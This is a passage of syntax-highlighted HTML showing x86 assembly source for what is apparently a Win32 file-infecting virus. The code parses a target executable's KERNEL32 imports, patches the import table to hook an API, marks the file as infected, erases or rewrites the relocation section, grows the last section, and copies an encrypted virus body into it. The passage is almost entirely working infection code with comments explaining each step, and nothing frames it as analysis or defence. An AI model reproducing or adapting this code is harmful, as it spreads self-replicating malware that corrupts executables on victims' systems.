</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_NotFound</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"NREK"</span><span class="sc0">                   </span><span class="sc1">;are there imports</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DllFound</span><span class="sc0">                                  </span><span class="sc1">;from kernel32.dll?</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"nrek"</span><span class="sc0">                   </span><span class="sc1">;  "      "</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DllFound</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchDll</span><span class="sc0">


</span><span class="sc5">_NotFoundV</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_NotFound</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitInfectError0</span><span class="sc0">           


</span><span class="sc5">DllFound</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;edi= file pointer to KERNEL32.DLL structure in target</span><span class="sc0">



</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;TimeDate stamp set to 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;eax=RVA of OriginalFirstThunk </span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;edx=RVA of FirstThunk</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_FieldFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                               </span><span class="sc1">;compute file ptr to host First Thunk</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;restore image base</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                               </span><span class="sc1">;save it again</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        

</span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                           </span><span class="sc1">;compute VA of FirstThunk</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">          </span><span class="sc1">;save it</span><span class="sc0">




</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">No_OFT</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_OFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_OFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;File pointer to Original first</span><span class="sc0">
                                               </span><span class="sc1">;thunk</span><span class="sc0">

</span><span class="sc1">;[Compute the number of imported APIs from KERNEL32.DLL]:</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                               
                                        
</span><span class="sc5">ApiScan</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ApiScan</span><span class="sc0">


</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                        </span><span class="sc1">;ecx holds number of imported APIs from K32</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SizeT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">


</span><span class="sc1">;*********************************************************************</span><span class="sc0">


</span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OFT_Found</span><span class="sc0">

</span><span class="sc5">No_OFT</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                            


</span><span class="sc5">OFT_Found</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">                        </span><span class="sc1">;eax contains the RVA of an array of</span><span class="sc0">
                                       </span><span class="sc1">;RVAs.</span><span class="sc0">
                                       </span><span class="sc1">;Each of these RVAs points to a structure</span><span class="sc0">
                                       </span><span class="sc1">;The number of structures equals the</span><span class="sc0">
                                       </span><span class="sc1">;number of imported functions from</span><span class="sc0">
                                       </span><span class="sc1">;KERNEL32.DLL</span><span class="sc0">
                                       </span><span class="sc1">;We need to convert eax into a file</span><span class="sc0">
                                       </span><span class="sc1">;pointer.</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">ApiHack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">





</span><span class="sc5">Loop2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">;eax=map ptr to OFT array</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">;edx= rva, browsing ft array </span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;read an RVA of array</span><span class="sc0">


</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">


</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_NotFound</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">                     </span><span class="sc1">;ordinal?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                           </span><span class="sc1">;convert RVA to file offset</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Rva2Offset</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;esi points to api name</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">


</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">DoAgain</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">;move the api name into ApiHack</span><span class="sc0">

</span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">;end of string?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">DoAgain</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                            </span><span class="sc1">;string + ",0" is 12 char?</span><span class="sc0">
</span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">Loop2</span><span class="sc0">                              </span><span class="sc1">;not enough?...go back to Loop2</span><span class="sc0">


</span><span class="sc6">pushad</span><span class="sc0">


</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                             

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VA_API</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">                  

</span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">GlobalAPI</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">                             </span><span class="sc1">;GlobalAlloc string replace</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;one of api of the host</span><span class="sc0">


</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                               </span><span class="sc1">;edi =ImageBase of target</span><span class="sc0">


</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                           </span><span class="sc1">;address in Import table</span><span class="sc0">


 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HackAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">        

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Field</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">


</span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;***** End Import table Patching routine</span><span class="sc0">



 
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                      </span><span class="sc1">;restore MapAddress </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;save pointer to code loader </span><span class="sc0">

 

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0"> </span><span class="sc1">;modify key</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc3">"IT"</span><span class="sc0">     </span><span class="sc1">;mark the infected target</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc1">;set FileAligment=200h</span><span class="sc0">

         
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">      
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;pointer to reloc section</span><span class="sc0">
        

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NoReloc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0a00h</span><span class="sc0">
        </span><span class="sc6">jnge</span><span class="sc0"> </span><span class="sc5">NoReloc</span><span class="sc0">

</span><span class="sc1">;[Erase Relocation Section]:</span><span class="sc0">

        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">40</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">               
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">+</span><span class="sc2">96</span><span class="sc4">+</span><span class="sc2">44</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"adP."</span><span class="sc0">           </span><span class="sc1">;change the section name</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc3">"at"</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LastSectionCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> 
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">VirLength</span><span class="sc0">            

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CopyEncrypt</span><span class="sc0">

</span><span class="sc1">;************************************************************************</span><span class="sc0">

 
</span><span class="sc5">NoReloc</span><span class="sc4">:</span><span class="sc0">



        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add rounded up last section raw-size</span><span class="sc0">

</span><span class="sc1">;[Compute beginning of code in the last section ,in memory]:</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;last section RVA in memory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;add last section rounded up size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ImageBase</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LastSectionCode</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        
     


</span><span class="sc1">;[Update size field in target last section header]:</span><span class="sc0">

   
        
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc2">0a00h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0"> 



</span><span class="sc1">;[Update size fields in target optional header]:</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc2">1000h</span><span class="sc0">



</span><span class="sc5">CopyEncrypt</span><span class="sc4">:</span><span class="sc0">



</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_NewFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FP_FieldFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">





          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">API_Field</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_FT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RVA_NewFT</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ReturnAdd</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">Import</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">        






</span><span class="sc1">;[Copy and encrypt code in the last section]:</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">EndVir</span><span class="sc4">-</span><span class="sc5">BeginVir</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">BeginVir</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc0">

</span><span class="sc1">;[ClearHeap]:</span><span class="sc0">
         

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
